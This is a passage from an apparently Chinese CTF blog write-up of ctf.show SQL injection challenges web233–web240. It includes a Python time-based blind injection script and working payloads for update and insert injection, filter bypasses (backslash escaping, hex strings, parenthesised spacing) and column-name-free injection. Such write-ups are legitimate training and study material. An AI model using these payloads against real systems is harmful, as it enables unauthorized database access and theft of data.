class="token string" style="color:#e3116c">&#x27;http://7cf24fdd-904d-48f6-81ac-0b88a27076ca.challenge.ctf.show/api/&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j</span><span class="token operator" style="color:#393A34">=</span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">==</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag</span><span class="token operator" style="color:#393A34">+=</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.02),1)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;),{i},1))&lt;{j},sleep(0.02),1)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if(ascii(substr((select group_concat(flagass233) from flag233333),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.02),1)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&#x27;password&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.35</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.3</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web234">web234<a href="#web234" class="hash-link" aria-label="Direct link to web234" title="Direct link to web234">​</a></h3>
<p>update</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//分 页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;update ctfshow_user set pass = &#x27;{$password}&#x27; where username = &#x27;{$username}&#x27;;&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这不和上面还是一样的么，过滤也显示无过滤（群主肯定偷偷在黑名单了</p>
<p>嗷呜，师傅们说原来过滤了单引号，可以用反斜杠来绕过</p>
<p>如果写了反斜杠，password=\那么上面的语句就变成了</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$sql = &quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;{$username}&#x27;;&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>诶，此时where username就成了字符串，where也丢失了其作用，这样就可以通过username来进行注入</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;banlist,ctfshow_user,flag23a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password=\&amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">因为过滤了单引号，所以16进制绕过。&gt;id,flagass23s3,info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password=\&amp;username=,username=(select flagass23s3 from flag23a)#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web235">web235<a href="#web235" class="hash-link" aria-label="Direct link to web235" title="Direct link to web235">​</a></h3>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;update ctfshow_user set pass = &#x27;{$password}&#x27; where username = &#x27;{$username}&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //过滤 or &#x27; </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><del>终于当人了是吧</del> 终于给黑名单了</p>
<p>好，继续用上面的</p>
<p>诶，为啥没成功呢。焯，又偷偷过滤</p>
<p>在or和&#x27;的基础上，还过滤了information_schema</p>
<p><a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener noreferrer">https://www.jb51.net/article/134678.htm</a></p>
<p><img decoding="async" loading="lazy" alt="image-20220112112610065" src="/assets/images/image-20220112112610065-10aa608f0db0e77499b3cc08b2e39469.png" width="881" height="401" class="img_ev3q"></p>
<p>用mysql.innodb_table_stats来代替information_schema。table_schema就要改成database_name。语句则是</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;banlist,ctfshow_user,flag23a1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来就要用到无列名注入了，不得不说，师傅们姿势真的多。</p>
<p><a href="https://www.cnblogs.com/GH-D/p/11962522.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/GH-D/p/11962522.html</a></p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">password=\&amp;username=,username=(select group_concat(`2`) from (select 1,2,3 union select * from flag23a1)a)#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web236">web236<a href="#web236" class="hash-link" aria-label="Direct link to web236" title="Direct link to web236">​</a></h3>
<p>update</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;update ctfshow_user set pass = &#x27;{$password}&#x27; where username = &#x27;{$username}&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //过滤 or &#x27; flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>本来想用16进制绕过，但是不知道为啥没有绕过。结果就用上面的payload反而还打通了</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web237">web237<a href="#web237" class="hash-link" aria-label="Direct link to web237" title="Direct link to web237">​</a></h3>
<p>insert注入</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //插入数据</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;insert into ctfshow_user(username,pass) value(&#x27;{$username}&#x27;,&#x27;{$password}&#x27;);&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>insert就是插入。但其实注入方式和一般的没有区别,只是说自己构造出查询语句，查询的结果返回在那个表当中了</p>
<p>然后这里没有任何过滤，只需要把username闭合一下然后后面随便写</p>
<p>注意到有添加的按钮，就直接添加了，我就不去</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username=helloworld&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username=helloworld&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;));#&amp;password=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username=helloworld&#x27;,(select group_concat(flagass23s3) from flag))#&amp;password=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web238">web238<a href="#web238" class="hash-link" aria-label="Direct link to web238" title="Direct link to web238">​</a></h3>
<p>insert注入，过滤空格</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username=helloworld&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username=helloworld&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flagb&#x27;)));#&amp;password=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username=helloworld&#x27;,(select(group_concat(flag))from(flagb)));#&amp;password=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web239">web239<a href="#web239" class="hash-link" aria-label="Direct link to web239" title="Direct link to web239">​</a></h3>
<p>过滤了空格和or，因为过滤了or，所以information_schema就用不了了，我喜欢的helloworld也用不了了呜呜呜，可恶的infor</p>
<p>于是用之前的mysql.innodb_table_stats来替代</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username=1&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1&#x27;,(select(flag)from(flagbb)));#&amp;password=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web240">web240<a href="#web240" class="hash-link" aria-label="Direct link to web240" title="Direct link to web240">​</a></h3>
<p>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写。过滤空格 or sys mysql</p>
<p>啥玩意，自己爆是吧。</p>
<p>然后根据前面都是在flag里，所以flag先确定下来。然后直接写脚本</p>
